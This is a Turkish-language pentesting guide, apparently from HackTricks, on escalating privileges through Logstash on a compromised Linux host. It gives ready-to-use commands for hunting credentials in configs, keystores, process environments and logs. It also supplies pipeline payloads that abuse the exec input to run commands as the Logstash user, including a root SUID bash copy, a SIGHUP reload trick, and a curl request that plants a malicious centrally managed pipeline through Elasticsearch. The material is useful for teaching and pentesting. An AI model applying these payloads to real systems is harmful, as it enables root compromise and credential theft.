# Logstash Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash, **pipeline** olarak bilinen bir sistem üzerinden **logları toplamak, dönüştürmek ve dağıtmak** için kullanılır. Bu pipeline'lar **input**, **filter** ve **output** aşamalarından oluşur. Logstash'in ele geçirilmiş bir makinede çalışması ilginç bir durum ortaya çıkarır.

### Pipeline Yapılandırması

Pipeline'lar, pipeline yapılandırmalarının konumlarını listeleyen **/etc/logstash/pipelines.yml** dosyasında yapılandırılır:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Bu dosya, pipeline yapılandırmalarını içeren **.conf** dosyalarının konumunu gösterir. **Elasticsearch output module** kullanıldığında, **pipelines** genellikle **Elasticsearch credentials** içerir; Logstash'ın Elasticsearch'e veri yazması gerektiğinden bu credentials çoğu zaman geniş ayrıcalıklara sahiptir. Yapılandırma yollarındaki wildcard'lar, Logstash'ın belirtilen dizindeki eşleşen tüm pipeline'ları çalıştırmasına olanak tanır.

Logstash, `pipelines.yml` yerine `-f <directory>` ile başlatılırsa, bu dizindeki **tüm dosyalar** sözlükbilimsel sırayla birleştirilir ve tek bir config olarak ayrıştırılır. Bu durum saldırı açısından iki sonuç doğurur:

- `000-input.conf` veya `zzz-output.conf` gibi bırakılan bir dosya, nihai pipeline'ın nasıl oluşturulduğunu değiştirebilir
- Hatalı biçimlendirilmiş bir dosya, tüm pipeline'ın yüklenmesini engelleyebilir; bu nedenle auto-reload'a güvenmeden önce payload'ları dikkatlice doğrulayın

### Compromised Host Üzerinde Hızlı Enumeration

Logstash'ın kurulu olduğu bir host'ta hızlıca inceleyin:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Ayrıca yerel izleme API'sine erişilebildiğini kontrol edin. Varsayılan olarak **127.0.0.1:9600** adresine bağlanır; bu, host'a erişim sağladıktan sonra genellikle yeterlidir:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Bu işlem genellikle size pipeline ID'leri, runtime ayrıntıları ve değiştirilmiş pipeline'ınızın yüklendiğine dair doğrulama sağlar.

Logstash'tan elde edilen credentials genellikle **Elasticsearch**'in kilidini açar; bu nedenle [Elasticsearch hakkındaki diğer sayfaya](../../network-services-pentesting/9200-pentesting-elasticsearch.md) göz atın.

### Yazılabilir Pipelines ile Privilege Escalation

Privilege escalation denemek için öncelikle Logstash servisinin hangi kullanıcı altında çalıştığını belirleyin; bu genellikle **logstash** kullanıcısıdır. Aşağıdaki kriterlerden **birini** karşıladığınızdan emin olun:

- Bir pipeline **.conf** dosyasına **write access** sahibi olmak **veya**
- **/etc/logstash/pipelines.yml** dosyasının bir wildcard kullanması ve hedef klasöre yazabilmeniz

Ek olarak, aşağıdaki koşullardan **biri** karşılanmalıdır:

- Logstash servisini yeniden başlatabilme yeteneği **veya**
- **/etc/logstash/logstash.yml** dosyasında **config.reload.automatic: true** ayarının etkin olması

Configuration'da bir wildcard bulunduğunda, bu wildcard ile eşleşen bir dosya oluşturmak command execution sağlar. Örneğin:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Burada **interval**, saniye cinsinden çalıştırma sıklığını belirler. Verilen örnekte **whoami** komutu her 120 saniyede bir çalışır ve çıktısı **/tmp/output.log** dosyasına yönlendirilir.

**/etc/logstash/logstash.yml** içinde **config.reload.automatic: true** ayarlandığında Logstash, yeniden başlatılmasına gerek kalmadan yeni veya değiştirilmiş pipeline yapılandırmalarını otomatik olarak algılar ve uygular. Wildcard yoksa mevcut yapılandırmalarda yine değişiklik yapılabilir; ancak kesintileri önlemek için dikkatli olunması önerilir.

### Daha Güvenilir Pipeline Payload'ları

`exec` input plugin'i mevcut sürümlerde hâlâ çalışır ve bir `interval` veya `schedule` gerektirir. Logstash JVM'ini **forking** yoluyla çalıştırdığı için bellek kısıtlıysa payload'unuz sessizce çalışmak yerine `ENOMEM` hatasıyla başarısız olabilir.

Daha pratik bir privilege-escalation payload'u genellikle kalıcı bir artifact bırakan payload'dur:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Yeniden başlatma yetkiniz yoksa ancak sürece signal gönderebiliyorsanız, Logstash Unix benzeri sistemlerde **SIGHUP** ile tetiklenen bir yeniden yüklemeyi de destekler:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Her plugin reload için uygun değildir. Örneğin **stdin** input'u automatic reload işlemini engeller; bu nedenle `config.reload.automatic` ayarının değişikliklerinizi her zaman algılayacağını varsaymayın.

### Logstash'tan Secret'ları Çalma

Yalnızca code execution'a odaklanmadan önce Logstash'ın zaten erişebildiği verileri toplayın:

- Plaintext credentials genellikle `elasticsearch {}` output'ları, `http_poller`, JDBC input'ları veya cloud ile ilgili ayarlar içinde hardcode edilmiş olur
- Secure settings **`/etc/logstash/logstash.keystore`** dosyasında ya da başka bir `path.settings` dizininde bulunabilir
- Keystore password çoğunlukla **`LOGSTASH_KEYSTORE_PASS`** üzerinden sağlanır; package tabanlı kurulumlar bunu genellikle **`/etc/sysconfig/logstash`** dosyasından alır
- `${VAR}` ile yapılan environment-variable expansion, Logstash startup sırasında çözülür; bu nedenle service environment'ı incelemeye değerdir

Faydalı kontroller:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Bu da kontrol edilmeye değer; çünkü **CVE-2023-46672**, belirli koşullar altında Logstash'in hassas bilgileri loglara kaydedebildiğini gösterdi. Bu nedenle, mevcut config secret'ları satır içinde saklamak yerine keystore'a referans verse bile, post-exploitation yapılan bir host'taki eski Logstash logları ve `journald` girdileri credential'ları açığa çıkarabilir.

### Centralized Pipeline Management Abuse

Bazı ortamlarda host, yerel `.conf` dosyalarına hiç güvenmez. **`xpack.management.enabled: true`** yapılandırılmışsa Logstash, merkezi olarak yönetilen pipeline'ları Elasticsearch/Kibana'dan çekebilir ve bu mod etkinleştirildikten sonra yerel pipeline config'leri artık gerçeğin kaynağı değildir.

Bu, farklı bir attack path anlamına gelir:

1. Elastic credential'larını yerel Logstash ayarlarından, keystore'dan veya loglardan kurtarın
2. Hesabın **`manage_logstash_pipelines`** cluster privilege'ına sahip olup olmadığını doğrulayın
3. Merkezi olarak yönetilen bir pipeline oluşturun veya değiştirin; böylece Logstash host'u bir sonraki poll interval'ında payload'unuzu çalıştırır

Bu feature için kullanılan Elasticsearch API'si:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Bu, özellikle yerel dosyalar salt okunur olduğunda ancak Logstash zaten pipeline'ları uzaktan getirmek üzere kayıtlı olduğunda kullanışlıdır.

## Referanslar

- [Elastic Docs: Config Dosyasını Yeniden Yükleme](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Merkezi Pipeline Yönetimini Yapılandırma](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
